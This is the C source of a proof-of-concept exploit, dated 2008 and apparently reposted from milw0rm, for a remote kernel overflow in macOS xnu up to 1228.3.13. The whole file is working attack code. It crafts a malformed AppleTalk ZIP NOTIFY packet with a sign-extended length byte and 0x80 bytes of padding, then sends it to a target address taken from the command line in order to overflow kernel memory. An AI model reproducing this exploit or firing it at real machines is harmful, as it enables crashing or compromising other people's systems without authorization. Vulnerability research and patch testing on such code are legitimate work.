/* xnu-appletalk-zip.c
 *
 * Copyright (c) 2008 by <mu-b@digit-labs.org>
 *
 * Apple MACOS X xnu <= 1228.3.13 appletalk zip-notify remote kernel overflow PoC
 * by mu-b - Sun 13 Apr 2008
 *
 * - Tested on: Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
 *              Apple MACOS X 10.5.2 (xnu-1228.3.13~1/RELEASE_I386)
 *
 * Compile: gcc -Wall xnu-appletalk-zip.c /usr/lib/libatalk.a -o xnu-appletalk-zip
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>

#include <netatalk/endian.h>
#include <netatalk/at.h>
#include <atalk/netddp.h>
#include <atalk/ddp.h>
#include <atalk/zip.h>
#include <atalk/util.h>

int
main (int argc, char **argv)
{
  struct sockaddr_at daddr, saddr;
  char *p, buf[1024];
  int fd, zlen;

  printf ("Apple MACOS X xnu <= 1228.3.13 appletalk zip-notify remote kernel overflow PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  if (argc < 3)
    {
      fprintf (stderr, "Usage: %s <dst addr> <zone> [src addr]\n", argv[0]);
      exit (EXIT_FAILURE);
    }

  if (!atalk_aton (argv[1], &daddr.sat_addr))
    {
      fprintf (stderr, "* dst address: atalk_aton failed\n");
      exit (EXIT_FAILURE);
    }

  if (argc > 3)
    {
      if (!atalk_aton (argv[3], &saddr.sat_addr))
        {
          fprintf (stderr, "* src address: atalk_aton failed\n");
          exit (EXIT_FAILURE);
        }
    }

  daddr.sat_family = AF_APPLETALK;
  daddr.sat_port = 6;

  if ((fd = netddp_open (argc > 3 ? &saddr
                                  : NULL, NULL)) < 0)
    {
      fprintf (stderr, "* netddp_open failed\n");
      exit (EXIT_FAILURE);
    }

  printf ("Appletalk dst: %s, ", argv[1]);
  if (argc > 3)
    printf ("src: %s, ", argv[3]);
  printf ("zone: %s... ", argv[2]);

  p = buf;
  *p++ = DDPTYPE_ZIP;
  *p++ = ZIPOP_NOTIFY;  /* ZIP NOTIFY   */
  *p++ = 0x00;

  *p++ = 0x00;          /* pad          */
  *p++ = 0x00;
  *p++ = 0x00;
  *p++ = 0x00;

  zlen = strlen (argv[2]);
  *p++ = zlen;
  memcpy (p, argv[2], zlen);
  p += zlen;

  *p++ = 0x80;          /* >= 0x80 sign extended :(
                         * <  0x80 not enough to hit anything useful,
                         *         except maybe ifPort...
                         */
  memset (p, 0x41, 0x80);
  p += 0x80;

  if (netddp_sendto (fd, buf, p - buf, 0, (struct sockaddr *) &daddr,
                                          sizeof (struct sockaddr_at)) < 0)
    {
      fprintf (stderr, "* netddp_sendto failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  return (EXIT_SUCCESS);
}

// milw0rm.com [2009-03-23]